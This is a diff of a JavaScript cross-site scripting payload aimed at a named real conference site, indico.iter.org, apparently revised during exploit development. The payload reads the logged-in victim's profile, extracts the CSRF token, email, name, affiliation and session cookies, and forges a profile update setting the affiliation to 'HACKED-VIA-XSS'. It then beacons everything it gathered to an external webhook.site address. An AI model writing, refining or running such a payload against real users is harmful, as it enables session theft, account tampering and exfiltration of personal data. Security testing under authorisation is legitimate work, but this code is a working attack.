@@ -1,38 +1,36 @@
 (function () {
-    var WEBHOOK = 'https://webhook.site/d4a92c22-be5c-4ee4-86c1-70ac738e3d61';
-    var cookies = document.cookie;
+  var WEBHOOK = 'https://webhook.site/d4a92c22-be5c-4ee4-86c1-70ac738e3d61';
+  var cookies = document.cookie;
 
-    fetch('https://indico.iter.org/user/profile/', {
-      credentials: 'include'
-    })
-      .then(function (r) { return r.text(); })
-      .then(function (html) {
-        var g = function (re) { var m = html.match(re); return m ? m[1] : null; };
+  fetch('https://indico.iter.org/user/profile/', {
+    credentials: 'include'
+  })
+    .then(function (r) { return r.text(); })
+    .then(function (html) {
+      var g = function (re) { var m = html.match(re); return m ? m[1] : null; };
 
-        var csrf = g(/name="csrf-token"[^>]*content="([^"]+)"/)
-          || g(/name="csrf_token"[^>]*value="([^"]+)"/);
-        var email = g(/name="email"[^>]*value="([^"]+)"/)
-          || g(/"email":\s*"([^"]+)"/)
-          || g(/email['"]\s*:\s*['"]([\w.+-]+@[\w.-]+)['"]/);
-        var firstName = g(/name="first_name"[^>]*value="([^"]+)"/)
-          || g(/"first_name":\s*"([^"]+)"/);
-        var lastName = g(/name="last_name"[^>]*value="([^"]+)"/)
-          || g(/"last_name":\s*"([^"]+)"/);
-        var affiliation = g(/name="affiliation"[^>]*value="([^"]+)"/)
-          || g(/"affiliation":\s*"([^"]+)"/);
+      var csrf = g(/name="csrf-token"[^>]*content="([^"]+)"/)
+        || g(/name="csrf_token"[^>]*value="([^"]+)"/);
+      var email = g(/name="email"[^>]*value="([^"]+)"/)
+        || g(/"email":\s*"([^"]+)"/)
+        || g(/email['"]\s*:\s*['"]([\w.+-]+@[\w.-]+)['"]/);
+      var firstName = g(/name="first_name"[^>]*value="([^"]+)"/)
+        || g(/"first_name":\s*"([^"]+)"/);
+      var lastName = g(/name="last_name"[^>]*value="([^"]+)"/)
+        || g(/"last_name":\s*"([^"]+)"/);
+      var affiliation = g(/name="affiliation"[^>]*value="([^"]+)"/)
+        || g(/"affiliation":\s*"([^"]+)"/);
 
-        var evidence = {
-          step: 'read',
-          csrf: csrf,
-          email: email,
-          first_name: firstName,
-          last_name: lastName,
-          affiliation: affiliation,
-          cookies: cookies
-        };
+      var evidence = {
+        step: 'read',
+        csrf: csrf,
+        email: email,
+        first_name: firstName,
+        last_name: lastName,
+        affiliation: affiliation,
+        cookies: cookies
+      };
 
-        if (!csrf || !email) {
-          evidence.error = 'extraction failed';
       if (!csrf || !email) {
         evidence.error = 'extraction failed';
         evidence.html_chunk = html.substring(3000, 8000);
@@ -40,15 +38,20 @@
         return;
       }
 
-      var payload = 'csrf_token=' + encodeURIComponent(csrf)
-        + '&first_name=' + encodeURIComponent(firstName || '')
-        + '&last_name=' + encodeURIComponent(lastName || '')
-        + '&email=' + encodeURIComponent(email)
+      var payload = JSON.stringify({
+        first_name: firstName,
+        last_name: lastName,
+        email: email,
+        affiliation: 'HACKED-VIA-XSS'
+      });
 
       fetch('https://indico.iter.org/user/profile/', {
         method: 'POST',
         credentials: 'include',
-        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+        headers: {
+          'Content-Type': 'application/json',
+          'X-CSRF-Token': csrf
+        },
         body: payload
       })
         .then(function (r) {
@@ -58,10 +61,7 @@
           return r.text();
         })
         .then(function (html2) {
-          var newAff = html2.match(/"affiliation":\s*"([^"]+)"/)
-            || html2.match(/name="affiliation"[^>]*value="([^"]+)"/);
-          evidence.affiliation_after = newAff ? newAff[1] : '(check profile)';
-          evidence.post_snippet = html2.substring(0, 2000);
+          evidence.post_response = html2.substring(0, 4000);
           report(evidence);
         });
     })
@@ -78,8 +78,7 @@
       + 'CSRF: ' + (ev.csrf || 'n/a') + '\n'
       + 'Email: ' + (ev.email || 'n/a') + '\n'
       + 'Name: ' + (ev.first_name || '') + ' ' + (ev.last_name || '') + '\n'
-      + 'Affiliation before: ' + (ev.affiliation || 'n/a') + '\n'
-      + 'Affiliation after: ' + (ev.affiliation_after || 'n/a') + '\n'
+      + 'Affiliation: ' + (ev.affiliation || 'n/a') + '\n'
       + 'POST status: ' + (ev.post_status || '?');
     document.body.appendChild(b);
     navigator.sendBeacon(WEBHOOK, JSON.stringify(ev));
